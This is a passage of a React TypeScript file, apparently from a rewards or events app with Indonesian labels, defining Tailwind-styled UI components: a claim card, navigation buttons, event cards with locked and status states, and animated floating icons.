       <div className="text-[7px] font-bold text-brand-primary/60 uppercase tracking-tighter mb-2">{subtitle}</div>
       <div className="text-lg font-display gold-gradient-text">${value}</div>
       <button className="mt-3 w-full py-1 bg-white/5 border border-white/10 rounded-lg text-[8px] font-black uppercase tracking-[0.2em] group-hover:bg-brand-primary group-hover:text-black transition-all">AMBIL</button>
    </div>
  );
}

function NavButton({ icon, label, active = false, onClick = () => {} }: { icon: React.ReactNode; label: string; active?: boolean; onClick?: () => void }) {
  return (
    <button onClick={onClick} className="flex flex-col items-center gap-1">
       <div className={cn(
         "transition-all duration-300",
         active ? "text-brand-primary scale-110" : "text-white/20"
       )}>
         {icon}
       </div>
       <span className={cn("text-[8px] font-black tracking-widest italic", active ? "text-brand-primary" : "text-white/20")}>{label}</span>
    </button>
  );
}

function EventCard({ title, desc, icon, accent, action, locked, status, onClick }: { title: string; desc: string; icon: React.ReactNode; accent: string; action?: React.ReactNode; locked?: boolean; status?: string; onClick?: () => void }) {
  const colors: Record<string, string> = {
    green: "border-brand-secondary/30 from-emerald-900/40 text-brand-secondary",
    gold: "border-brand-primary/30 from-yellow-900/40 text-brand-primary",
    orange: "border-orange-500/30 from-orange-900/40 text-orange-500",
    blue: "border-blue-500/30 from-blue-900/40 text-blue-500",
    purple: "border-purple-500/30 from-purple-900/40 text-purple-500",
    red: "border-red-500/30 from-red-900/40 text-red-500"
  };

  return (
    <div onClick={onClick} className={cn(
      "relative rounded-3xl border p-4 bg-gradient-to-br to-black/20 flex flex-col h-full overflow-hidden transition-all group hover:scale-[1.02] hover:shadow-xl",
      colors[accent] || colors.green,
      locked && "opacity-60 grayscale",
      onClick && "cursor-pointer"
    )}>
      {status && (
        <div className="absolute top-0 right-0 px-2 py-1 bg-white/10 rounded-bl-xl text-[7px] font-black uppercase tracking-widest z-10">{status}</div>
      )}
      {locked && (
        <div className="absolute inset-0 z-20 flex items-center justify-center bg-black/40 backdrop-blur-[2px]">
           <span className="px-3 py-1 bg-black/80 rounded-full border border-white/20 text-[8px] font-black tracking-widest uppercase">Segera Hadir</span>
        </div>
      )}
      
      <div className="mb-4 group-hover:scale-110 transition-transform w-fit">
         {icon}
      </div>
      
      <div className="flex-1 mb-4">
        <h4 className="text-sm font-black uppercase italic tracking-tighter mb-1 leading-none">{title}</h4>
        <p className="text-[9px] font-bold text-white/40 uppercase tracking-wider">{desc}</p>
      </div>

      {action && <div className="mt-auto">{action}</div>}
    </div>
  );
}

function FloatingIcon({ icon, className, delay }: { icon: React.ReactNode; className: string; delay: number }) {
  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      className={cn("absolute animate-float", className)}
      style={{ animationDelay: `${delay}s` }}
    >
      {icon}
    </motion.div>
  );
}
